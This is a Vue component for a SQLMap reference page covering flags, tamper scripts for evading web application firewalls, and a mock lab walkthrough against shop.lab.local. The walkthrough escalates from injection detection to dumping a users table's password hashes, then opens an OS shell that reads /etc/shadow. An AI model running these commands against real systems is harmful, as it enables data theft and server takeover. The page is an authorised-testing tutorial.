<script setup>
import data from "../../database/sqlmap.json";

const techniques = data.techniques;
const commonFlags = data.commonFlags;
const enumerationFlow = data.enumerationFlow;
const tamperScripts = data.tamperScripts;
const recipes = data.recipes;
const tips = data.tips;
const limitations = data.limitations;
</script>

<template>
  <div class="page-shell" style="--accent: #e84a5f">
    <div class="page">
      <header class="hdr">
        <div class="icon">⌬</div>
        <div>
          <h1>SQLMap</h1>
          <div class="sub">
            Automated SQL-injection detection and database takeover —
            from "is this param injectable?" to "give me a Meterpreter
            session" in one tool.
          </div>
        </div>
        <a
          class="external"
          href="https://sqlmap.org/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Open homepage ↗
        </a>
      </header>

      <div class="warning">
        <strong>Authorisation required</strong>
        SQLMap sends thousands of payloads, will dump data, and can write
        files / drop shells when conditions allow. Only point it at
        applications you own or have explicit written authorisation to
        test.
      </div>

      <div class="callout">
        <strong>What it is</strong>
        SQLMap is a Python tool that automates the entire
        SQL-injection lifecycle — <em>detection</em> across six
        techniques, <em>exploitation</em> via DB-specific payloads, and
        <em>post-exploitation</em> ranging from data dump to OS shell.
        Maintained by Bernardo Damele &amp; Miroslav Stampar; ships on
        Kali / Parrot.
      </div>

      <!-- How it works -->
      <section class="section">
        <h2>How it works</h2>
        <p class="prose">
          SQLMap walks each marked parameter, injects probe payloads,
          and watches the response for a tell-tale signal: a boolean
          difference, a verbose error, a UNION result, a delay. Once a
          working payload lands it auto-detects the DBMS, then switches
          into <strong>exploitation</strong> mode using fingerprinted
          payloads to enumerate or dump data. State is cached in
          <code>~/.local/share/sqlmap/output/&lt;target&gt;/</code> so
          subsequent runs against the same target re-use the discovered
          injection vector.
        </p>
      </section>

      <!-- Anatomy -->
      <section class="section">
        <h2>Anatomy of an invocation</h2>
        <div class="anatomy">
          <code class="anatomy__cmd">
            sqlmap <span class="hl">-r request.txt</span>
            <span class="hl">--batch</span>
            <span class="hl">--level=3</span>
            <span class="hl">--risk=2</span>
            <span class="hl">--dbs</span>
          </code>
          <div class="anatomy__legend">
            <div><code class="hl">-r request.txt</code> — raw HTTP request (from Burp)</div>
            <div><code class="hl">--batch</code> — accept all defaults, no prompts</div>
            <div><code class="hl">--level=3</code> — wider detection surface</div>
            <div><code class="hl">--risk=2</code> — more aggressive payloads</div>
            <div><code class="hl">--dbs</code> — list databases on success</div>
          </div>
        </div>
      </section>

      <!-- Techniques -->
      <section class="section">
        <h2>Detection techniques</h2>
        <p class="prose">
          SQLMap supports six families of injection. <code>--technique</code>
          restricts payloads to a subset (e.g. <code>BT</code> for blind
          + time-based when nothing visible comes back).
        </p>
        <div class="modes">
          <article v-for="t in techniques" :key="t.code" class="mode">
            <div class="mode__head">
              <h3>{{ t.name }}</h3>
              <code class="hl">{{ t.code }}</code>
            </div>
            <p class="mode__sum">{{ t.summary }}</p>
          </article>
        </div>
      </section>

      <!-- Common flags -->
      <section class="section">
        <h2>Common flags</h2>
        <p class="prose">
          The flags that travel across most engagements — input source,
          detection breadth/depth, DBMS hints, proxy, threading, and
          enumeration shortcuts. <code>sqlmap -hh</code> dumps the full
          (very long) reference.
        </p>
        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Flag</th>
                <th>What it does</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="f in commonFlags" :key="f.flag">
                <td><code class="hl">{{ f.flag }}</code></td>
                <td>{{ f.description }}</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Enumeration flow -->
      <section class="section">
        <h2>Post-detection enumeration ladder</h2>
        <p class="prose">
          Once SQLMap confirms injection, you climb a ladder from
          fingerprint to dump. Don't jump to <code>--dump-all</code> —
          scope first, dump second.
        </p>
        <div class="recipes">
          <article
            v-for="(s, i) in enumerationFlow"
            :key="s.step"
            class="rcard"
          >
            <h3>{{ i + 1 }}. {{ s.step }}</h3>
            <pre class="rcard__cmd"><code>{{ s.flag }}</code></pre>
            <p>{{ s.purpose }}</p>
          </article>
        </div>
      </section>

      <!-- Tamper scripts -->
      <section class="section">
        <h2>Tamper scripts (WAF evasion)</h2>
        <p class="prose">
          Tamper scripts mutate every payload before it leaves SQLMap —
          stripping spaces, randomising case, encoding characters. They
          help against simple keyword / regex WAFs; modern ML-backed
          WAFs see through them.
        </p>
        <div class="table-wrap">
          <table class="tbl">
            <thead>
              <tr>
                <th>Script</th>
                <th>What it does</th>
              </tr>
            </thead>
            <tbody>
              <tr v-for="t in tamperScripts" :key="t.name">
                <td><code class="hl">{{ t.name }}</code></td>
                <td>{{ t.purpose }}</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <!-- Recipes -->
      <section class="section">
        <h2>Recipes</h2>
        <p class="prose">
          Concrete invocations — GET-param test, POST data, full Burp
          request, scoped dump, OS shell, Burp pivoting, WAF evasion.
        </p>
        <div class="recipes">
          <article v-for="r in recipes" :key="r.title" class="rcard">
            <h3>{{ r.title }}</h3>
            <pre class="rcard__cmd"><code>{{ r.command }}</code></pre>
            <p>{{ r.details }}</p>
          </article>
        </div>
      </section>

      <!-- Mock walkthrough -->
      <section class="section">
        <h2>Mock walkthrough — login form to OS shell</h2>
        <p class="prose">
          A lab e-commerce app at <code>shop.lab.local</code> with a
          login endpoint that looks suspicious. Walk: capture in Burp →
          confirm injection → scope the dump → drop a shell. Each step
          calls out the SQLMap features in play.
        </p>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">1</span>
            <h3>Capture the request in Burp</h3>
          </header>
          <p class="walk__desc">
            Right-click the suspect request in Burp's Proxy →
            <em>Copy to file</em>. SQLMap reads everything from that file:
            method, URL, cookies, headers, body. No need to translate
            anything by hand.
          </p>
          <pre class="walk__cmd"><code>POST /login.php HTTP/1.1
Host: shop.lab.local
Cookie: PHPSESSID=abc123
Content-Type: application/x-www-form-urlencoded

username=admin&amp;password=test</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> Burp ↔ SQLMap handoff, <code>-r</code> input source.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">2</span>
            <h3>Confirm injection at default settings</h3>
          </header>
          <p class="walk__desc">
            Smallest viable run. <code>--batch</code> accepts all
            prompts; <code>-p username</code> pins the parameter so we
            don't waste time on the others.
          </p>
          <pre class="walk__cmd"><code>sqlmap -r req.txt --batch -p username
# Parameter: username (POST)
#   Type: error-based
#   Title: MySQL >= 5.0 AND error-based
#   Payload: admin' AND EXTRACTVALUE(...)
# back-end DBMS: MySQL >= 5.0</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>--batch</code>, <code>-p</code> param targeting, technique auto-detect, DBMS fingerprint.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">3</span>
            <h3>Fingerprint the privileges we landed with</h3>
          </header>
          <p class="walk__desc">
            Before pulling data, see what the DB user can do. DBA means
            <code>--os-shell</code> later is realistic; non-DBA means we
            limit ourselves to data extraction.
          </p>
          <pre class="walk__cmd"><code>sqlmap -r req.txt --batch -p username \
  --current-user --current-db --is-dba --hostname
# current user:    'shopapp'@'%'
# current database: shop
# current user is DBA: True   ← OS shell is on the table</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> privilege fingerprint, <code>--is-dba</code>.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">4</span>
            <h3>Climb the enumeration ladder</h3>
          </header>
          <p class="walk__desc">
            Scope before dump: list DBs, then tables, then columns, then
            dump only the columns that matter. SQLMap caches the
            injection vector in its session DB so each step is fast.
          </p>
          <pre class="walk__cmd"><code>sqlmap -r req.txt --batch --dbs
# available databases: shop, information_schema, mysql

sqlmap -r req.txt --batch -D shop --tables
# Tables: customers, orders, products, users

sqlmap -r req.txt --batch -D shop -T users --columns
# Columns: id, email, password_hash, role

sqlmap -r req.txt --batch -D shop -T users \
  -C email,password_hash,role --dump
# 247 rows dumped to ~/.local/share/sqlmap/output/shop.lab.local/dump/shop/users.csv</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>--dbs</code> / <code>--tables</code> / <code>--columns</code> / <code>--dump</code>, scoped extraction.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">5</span>
            <h3>Pivot to an OS shell</h3>
          </header>
          <p class="walk__desc">
            DBA + a writable webroot means SQLMap can stage a small
            uploader and hand us an interactive shell. Backups, config
            files, even keys live one OS command away.
          </p>
          <pre class="walk__cmd"><code>sqlmap -r req.txt --batch --os-shell
# what is the web application language?  PHP
# please provide the webroot path:        /var/www/html
# os-shell> id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# os-shell> cat /etc/shadow | head -3</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>--os-shell</code>, post-exploitation, web-stack assumptions.</p>
        </article>

        <article class="walk">
          <header class="walk__head">
            <span class="walk__num">6</span>
            <h3>Inspect everything via Burp</h3>
          </header>
          <p class="walk__desc">
            For debugging or learning, route SQLMap through Burp.
            Every payload it sends shows up in HTTP history — invaluable
            for understanding why a run found nothing, or for adapting
            the discovered payload to a manual exploit.
          </p>
          <pre class="walk__cmd"><code>sqlmap -r req.txt --batch --proxy=http://127.0.0.1:8080
# In Burp: Proxy → HTTP history → filter Host: shop.lab.local
# Inspect each payload, copy the working one into Repeater.</code></pre>
          <p class="walk__feat"><strong>Touches:</strong> <code>--proxy</code>, Burp integration, payload inspection.</p>
        </article>
      </section>

      <!-- Tips -->
      <section class="section">
        <h2>Tips &amp; gotchas</h2>
        <ul class="bulletlist">
          <li v-for="t in tips" :key="t">{{ t }}</li>
        </ul>
      </section>

      <!-- Limitations -->
      <section class="section">
        <h2>Limitations</h2>
        <ul class="bulletlist bulletlist--warn">
          <li v-for="l in limitations" :key="l">{{ l }}</li>
        </ul>
      </section>

      <footer class="ft">
        Reference data sourced from <code>database/sqlmap.json</code>
      </footer>
    </div>
  </div>
</template>

<style scoped>
.hdr { position: relative; }
.external {
  position: absolute; top: 0; right: 0;
  font-family: var(--sans); font-size: 10.5px; font-weight: 600;
  text-transform: uppercase; letter-spacing: 0.08em;
  color: var(--accent); text-decoration: none;
  border: 1px solid var(--accent); border-radius: 999px;
  padding: 5px 10px;
  background: color-mix(in srgb, var(--accent) 14%, transparent);
}
.external:hover { background: color-mix(in srgb, var(--accent) 24%, transparent); }
@media (max-width: 640px) {
  .external { position: static; align-self: flex-start; margin-top: 6px; }
}

.warning {
  background: color-mix(in srgb, #d14c4c 10%, transparent);
  border: 1px solid #d14c4c; border-radius: 8px;
  padding: 12px 14px; font-size: 11.5px; color: var(--tx);
  margin-bottom: 18px; line-height: 1.6;
}
.warning strong {
  color: #ff8a8a; font-family: var(--sans); font-size: 10px;
  text-transform: uppercase; letter-spacing: 0.1em;
  display: block; margin-bottom: 4px;
}

.callout {
  background: var(--sf2); border: 1px solid var(--bd);
  border-left: 2px solid var(--accent); border-radius: 8px;
  padding: 12px 14px; font-size: 11.5px; color: var(--dm); margin-bottom: 24px;
}
.callout strong {
  color: var(--accent); font-family: var(--sans); font-size: 10px;
  text-transform: uppercase; letter-spacing: 0.1em;
  display: block; margin-bottom: 4px;
}
.callout em { color: var(--tx); font-style: italic; }
.callout code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 11px; color: var(--accent);
}

.section { margin-bottom: 32px; }
.section h2 {
  font-family: var(--sans); font-size: 15px; font-weight: 700;
  color: #fff; letter-spacing: 0.02em; margin: 0 0 12px;
}

.prose { color: var(--tx); font-size: 12.5px; line-height: 1.7; margin: 0 0 12px; }
.prose code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 11.5px; color: #9cdcfe;
}
.prose strong { color: #fff; }
.prose em { color: var(--accent); font-style: normal; }

.anatomy {
  background: var(--sf); border: 1px solid var(--bd);
  border-radius: 10px; padding: 14px 16px;
  display: flex; flex-direction: column; gap: 12px;
}
.anatomy__cmd {
  font-family: var(--mono); font-size: 13px; color: var(--tx);
  display: block; word-break: break-all;
}
.anatomy__cmd .hl { color: var(--accent); font-weight: 600; }
.anatomy__legend {
  display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
  gap: 6px 16px; font-size: 11.5px; color: var(--dm);
}
.anatomy__legend code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 0 5px; font-size: 11px;
  color: var(--accent); margin-right: 6px;
}

.modes {
  display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 12px;
}
.mode {
  background: var(--sf); border: 1px solid var(--bd);
  border-top: 2px solid var(--accent); border-radius: 10px;
  padding: 12px 14px; display: flex; flex-direction: column; gap: 8px;
}
.mode__head {
  display: flex; align-items: center; justify-content: space-between;
  gap: 8px; flex-wrap: wrap;
}
.mode__head h3 {
  margin: 0; font-family: var(--sans); font-size: 12.5px; font-weight: 700; color: #fff;
}
.mode__head code {
  font-family: var(--mono); font-size: 11px; color: var(--accent);
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 6px;
}
.mode__sum { margin: 0; font-size: 11.5px; line-height: 1.6; color: var(--tx); }

.table-wrap {
  overflow-x: auto; border: 1px solid var(--bd); border-radius: 8px; background: var(--sf);
}
.tbl { width: 100%; border-collapse: collapse; font-size: 12px; }
.tbl th, .tbl td {
  text-align: left; padding: 8px 12px;
  border-bottom: 1px solid var(--bd); vertical-align: top;
}
.tbl thead th {
  background: var(--sf2); font-family: var(--sans); font-size: 10px;
  font-weight: 700; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dm);
}
.tbl tbody tr:last-child td { border-bottom: 0; }
.tbl tbody tr:hover { background: var(--sf2); }
.tbl code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 11px; color: #9cdcfe;
  white-space: nowrap;
}
.tbl code.hl { color: var(--accent); border-color: var(--accent); }

.recipes {
  display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 12px;
}
.rcard {
  background: var(--sf); border: 1px solid var(--bd);
  border-top: 2px solid var(--accent); border-radius: 10px;
  padding: 12px 14px; display: flex; flex-direction: column; gap: 8px;
}
.rcard h3 { margin: 0; font-family: var(--sans); font-size: 12.5px; font-weight: 700; color: #fff; }
.rcard__cmd {
  margin: 0; background: var(--bg); border: 1px solid var(--bd);
  border-radius: 6px; padding: 8px 10px; font-family: var(--mono);
  font-size: 11.5px; color: var(--accent); overflow-x: auto; white-space: pre;
}
.rcard p { margin: 0; font-size: 11.5px; line-height: 1.6; color: var(--tx); }

/* Walkthrough */
.walk {
  background: var(--sf); border: 1px solid var(--bd);
  border-left: 2px solid var(--accent); border-radius: 10px;
  padding: 14px 16px; margin-bottom: 12px;
  display: flex; flex-direction: column; gap: 10px;
}
.walk__head { display: flex; align-items: center; gap: 12px; margin: 0; }
.walk__num {
  flex-shrink: 0; width: 26px; height: 26px; border-radius: 999px;
  background: color-mix(in srgb, var(--accent) 18%, transparent);
  border: 1px solid var(--accent); color: var(--accent);
  font-family: var(--sans); font-size: 11px; font-weight: 700;
  display: flex; align-items: center; justify-content: center;
}
.walk__head h3 {
  margin: 0; font-family: var(--sans); font-size: 13px; font-weight: 700; color: #fff;
}
.walk__head h3 code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 12px; color: var(--accent);
}
.walk__desc { margin: 0; font-size: 12px; line-height: 1.65; color: var(--tx); }
.walk__desc code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 11px; color: #9cdcfe;
}
.walk__desc strong { color: #fff; }
.walk__desc em { color: var(--accent); font-style: normal; }
.walk__cmd {
  margin: 0; background: var(--bg); border: 1px solid var(--bd);
  border-radius: 6px; padding: 10px 12px; font-family: var(--mono);
  font-size: 11.5px; color: var(--accent); overflow-x: auto;
  white-space: pre; line-height: 1.55;
}
.walk__feat { margin: 0; font-size: 11px; color: var(--dm); line-height: 1.5; }
.walk__feat strong {
  color: var(--accent); font-family: var(--sans); font-size: 10px;
  text-transform: uppercase; letter-spacing: 0.08em; margin-right: 4px;
}
.walk__feat code {
  background: var(--bg); border: 1px solid var(--bd);
  border-radius: 4px; padding: 1px 5px; font-size: 10.5px;
  color: var(--accent); margin: 0 1px;
}

.bulletlist {
  margin: 0; padding: 12px 14px 12px 30px;
  background: var(--sf); border: 1px solid var(--bd);
  border-left: 2px solid var(--accent); border-radius: 8px;
  display: flex; flex-direction: column; gap: 6px;
}
.bulletlist li { font-size: 12px; color: var(--tx); line-height: 1.6; }
.bulletlist--warn { border-left-color: #d14c4c; }
</style>
